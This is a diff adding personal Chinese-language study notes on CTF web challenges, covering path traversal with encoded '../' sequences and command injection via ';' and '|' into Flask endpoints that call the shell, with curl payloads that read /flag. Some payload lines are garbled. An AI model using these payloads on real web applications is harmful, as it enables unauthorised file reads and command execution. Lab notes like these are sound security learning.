@@ -1,0 +1,46 @@
+curl http://challenge.localhost/content/../../../flag
+    --当检查到代码出现 @app.route("/content", methods=["GET"])
+    @app.route("/content/<path:path>", methods=["GET"])
+    def challenge(path="index.html"):
+    requested_path = app.root_path + "/files/" + path
+    --则发现代码会将content后的路径处理为root，所以通过../../../ 返回到路径的根目录，然后通过flag获取flag
+    --但是网站会检测../为非法字符，所以使用转义符号%2e%2e%2f代替
+     curl http://challenge.localhost/content/%2e%2e%2f %2e%2e%2f %2e%2e%2f flag     
+            --%2e%2e%2f==../
+
+
+    curl http://challenge.localhost/data/fortunes/%2e%2e%2f%2e%2e%2f%2e%2e%2fflag 
+
+    curl "http://challenge.localhost/goal?dir=/challenge;cat /flag"、
+       --出现@app.route("/goal", methods=["GET"])
+            def challenge():
+                directory = flask.request.args.get("dir", "/challenge")
+                command = f"ls -l {directory}"
+
+    --此时存在一个/goal路径，可以使用curl访问，并且存在一个challenge()方法
+         --包括一个命令会强制执行ls -l /challenge,
+            --所以可以通过curl http://challenge.localhost/goal?dir=/challenge，去访问目录
+            --并且在加上curl http://challenge.localhost/goal?dir=/challenge;whoami 后发现当前用户为root
+            --所以可以通过curl http://challenge.localhost/goal?dir=/challenge;cat /flag 去获取flag
+            --但是因为url会将空格视为违法或者是并不是空格，所以需要使用%20代替空格
+    --当然一些挑战会尝试去除掉；,但是仍旧有|可以使用
+
+
+
+
+
+CMDi3
+    --command = f"ls -l '{directory}'"
+    --此挑战会将输入的目录加上引号，如果不增加修改的话会获得
+        -- curl "http://challenge.localhost/quest?subdirectory=/challenge|cat%20/flag"
+            --这个会将/challenge|cat%20/flag作为一整个目录传递到ls -l中
+    curl "http://challenge.localhost/quest?subdir/challenge|cat%20/flagectory=/challenge|cat%20/flag"
+        --此时shell会收到''/challenge|cat /flag'' 
+        --但是由于shell的错误理解，它认为前两个'' 是一对，后两个''是一对，所以会将/challenge|cat /flag则不被认为是一体的，而是两个命令
+        --所以会先执行ls -l /challenge，然后执行cat /flag
+CMDi4
+    -- curl "http://challenge.localhost/dare?tz-tag=;cat%20/flag;date"
+
+这两个挑战的核心都是因为使用了shell=True
+    --在shell中特殊符号; | & 等会被解释为shell命令，所以会执行多个命令
+    --所以在使用shell=True时，需要注意不要将用户输入的内容直接传递给shell，而是需要对用户输入进行过滤
